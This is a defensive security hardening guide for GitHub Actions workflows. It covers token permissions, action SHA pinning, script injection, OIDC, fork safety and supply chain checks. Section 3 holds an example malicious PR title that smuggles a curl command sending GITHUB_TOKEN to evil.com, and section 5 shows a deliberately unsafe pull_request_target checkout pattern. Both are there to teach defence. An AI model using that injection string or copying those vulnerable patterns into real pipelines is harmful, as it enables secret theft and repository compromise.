# Security Hardening Reference

> Extended security guidance for GitHub Actions workflows. Load on-demand when hardening pipelines or reviewing security posture.

---

## 1. Principle of Least Privilege

### Token Permissions

Set `permissions: {}` at the workflow level to deny all, then grant minimum per-job.

```yaml
# ✅ CORRECT: Deny-all at workflow, grant per-job
permissions: {}

jobs:
  build:
    permissions:
      contents: read
    # ...

  deploy:
    permissions:
      contents: read
      id-token: write  # OIDC only
    # ...

  release:
    permissions:
      contents: write      # Create releases
      attestations: write  # Sign artifacts
      id-token: write      # OIDC
    # ...
```

### Common Permission Grants

| Job Type | Permissions Required |
|----------|---------------------|
| Build / Test | `contents: read` |
| OIDC Cloud Auth | `contents: read`, `id-token: write` |
| Push to GHCR | `contents: read`, `packages: write` |
| Create Release | `contents: write` |
| Attest Artifacts | `attestations: write`, `id-token: write` |
| Comment on PR | `pull-requests: write` |
| CodeQL | `security-events: write` |
| Dependabot auto-merge | `contents: write`, `pull-requests: write` |

**Organization-level**: Set default `GITHUB_TOKEN` to read-only in org settings. Every repo inherits the restriction.

---

## 2. Action Pinning

**Always pin third-party actions to full commit SHAs.** Tags and branches are mutable—a compromised action could push malicious code to `v4`.

```yaml
# ✅ SAFE: Pinned to immutable commit SHA with version comment
- uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846  # v4.2.2

# ❌ UNSAFE: Mutable tag reference
- uses: actions/checkout@v4

# ❌ UNSAFE: Branch reference
- uses: actions/checkout@main
```

### Finding the SHA

1. Go to the action's Releases page on GitHub
2. Click the short commit SHA next to the version tag
3. Copy the full 40-character SHA from the commit page
4. Add a `# vX.Y.Z` comment for human readability

### Keeping SHAs Updated

Configure Dependabot to auto-update pinned SHAs:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      github-actions:
        patterns: ["*"]
```

### Organization Enforcement

Administrators can enforce SHA pinning via the allowed actions policy. Workflows using unpinned actions will fail.

---

## 3. Script Injection Prevention

**NEVER interpolate untrusted contexts directly in `run:` blocks.** GitHub expressions are expanded before the shell runs, allowing arbitrary command injection.

### Untrusted Contexts

These values are attacker-controlled and MUST be assigned to environment variables:

| Context | Risk |
|---------|------|
| `github.event.issue.title` | Attacker controls issue titles |
| `github.event.issue.body` | Attacker controls issue bodies |
| `github.event.pull_request.title` | Attacker controls PR titles |
| `github.event.pull_request.body` | Attacker controls PR bodies |
| `github.event.comment.body` | Attacker controls comment text |
| `github.event.review.body` | Attacker controls review text |
| `github.event.discussion.title` | Attacker controls discussion titles |
| `github.event.discussion.body` | Attacker controls discussion bodies |
| `github.head_ref` | Attacker controls branch names |
| `github.event.pages.*.page_name` | Attacker controls wiki page names |

### Safe Pattern

```yaml
# ❌ VULNERABLE: Direct interpolation enables shell injection
- run: echo "Processing PR: ${{ github.event.pull_request.title }}"
# An attacker PR titled: "; curl http://evil.com/exfil?token=$GITHUB_TOKEN; #
# would execute arbitrary commands

# ✅ SAFE: Environment variable intermediary
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR: $PR_TITLE"
```

### Safe Contexts

These contexts are controlled by GitHub and safe to interpolate directly:

- `github.ref`, `github.sha`, `github.repository`
- `github.actor` (controlled by GitHub auth)
- `github.run_id`, `github.run_number`
- `github.workflow`, `github.event_name`
- `matrix.*`, `needs.*`, `steps.*`

---

## 4. OIDC Authentication

Use OpenID Connect to eliminate long-lived cloud credentials entirely.

### AWS

```yaml
jobs:
  deploy:
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: us-east-1
```

**AWS IAM Trust Policy**:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"
        }
      }
    }
  ]
}
```

### Azure

```yaml
- uses: azure/login@a65d910e8af852a8061c627c456678983e180302  # v2.2.0
  with:
    client-id: ${{ vars.AZURE_CLIENT_ID }}
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```

### GCP

```yaml
- uses: google-github-actions/auth@ba79af03959ebeac9769e648f473a284504d9193  # v2.1.10
  with:
    workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/pool/providers/provider'
    service_account: 'sa@project.iam.gserviceaccount.com'
```

### OIDC Hardening

- Always include `repo` claim in subject identifier
- Use environment-scoped claims (`environment:production`) for deployment roles
- Be cautious with repo-only claims—any branch could assume the role
- Colons in environment names are URL-encoded in the `sub` claim (prevents spoofing)
- Use `job_workflow_ref` claim to restrict to specific reusable workflows

---

## 5. Fork Security

### `pull_request` vs `pull_request_target`

| Aspect | `pull_request` | `pull_request_target` |
|--------|---------------|----------------------|
| Workflow source | PR head branch | Repository default branch |
| Secrets access | Restricted for forks | Full access |
| Write permissions | Restricted for forks | Full GITHUB_TOKEN |
| Use case | Standard CI | Labeling, commenting |
| Security risk | Lower | **High**—never checkout PR code |

**Critical rule**: If using `pull_request_target`, NEVER `actions/checkout` the PR's head ref. The workflow has full secrets; the PR code is untrusted.

```yaml
# ❌ DANGEROUS: pull_request_target + checkout PR code = secret exfiltration
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Untrusted code + full secrets

# ✅ SAFE: pull_request_target without checking out PR code
on: pull_request_target
steps:
  - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea  # v7.0.1
    with:
      script: |
        github.rest.issues.addLabels({
          owner: context.repo.owner,
          repo: context.repo.repo,
          issue_number: context.issue.number,
          labels: ['needs-review']
        })
```

---

## 6. Self-Hosted Runner Security

- **NEVER use for public repositories**: Forks can execute arbitrary code on your infrastructure
- **Use ephemeral runners**: Destroy after each job; prevents persistent compromise
- **Network isolation**: Restrict outbound access to only required endpoints
- **Runner groups**: Control which repos can target which runners
- **ARC (Actions Runner Controller)**: Kubernetes-based autoscaling for ephemeral runners
- **Keep runners updated**: Patch OS and runner software regularly

---

## 7. Supply Chain Security

### Artifact Attestations

Create provenance records for build outputs:

```yaml
- uses: actions/attest-build-provenance@c074443f1aee8d4aeeae555aebba3282517141b2  # v2.2.3
  with:
    subject-path: dist/app.tar.gz
```

### Container Signing (Sigstore)

```yaml
- uses: sigstore/cosign-installer@3454372be428ca50782b3551ad6d1b27e28ac90a  # v3.8.0
- run: cosign sign ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
```

### CodeQL Scanning

```yaml
- uses: github/codeql-action/init@ea9e4e37992a54ee68a9f14f4a7d37691e944d9e  # v3.28.16
  with:
    languages: javascript
- uses: github/codeql-action/analyze@ea9e4e37992a54ee68a9f14f4a7d37691e944d9e  # v3.28.16
```

### Scorecard Auditing

```yaml
- uses: ossf/scorecard-action@f49aabe0b5af0936a0987cfb85d86b75731b0186  # v2.4.1
  with:
    results_file: results.sarif
    results_format: sarif
```

---

## 8. Security Checklist

Apply to every workflow before merge:

- [ ] `permissions: {}` at workflow level, minimum per-job grants
- [ ] All third-party actions pinned to full commit SHAs
- [ ] Version comments on every SHA-pinned action
- [ ] Dependabot configured for `github-actions` ecosystem
- [ ] No untrusted context interpolation in `run:` blocks
- [ ] OIDC used for all cloud authentication
- [ ] Environment protection rules on production
- [ ] Required reviewers configured for production environment
- [ ] `timeout-minutes` set on every job
- [ ] No use of `pull_request_target` with `actions/checkout` of PR code
- [ ] Self-hosted runners (if used) are ephemeral and network-isolated
- [ ] Artifact attestations on release artifacts
- [ ] CodeQL scanning enabled
- [ ] Secrets never echoed or logged
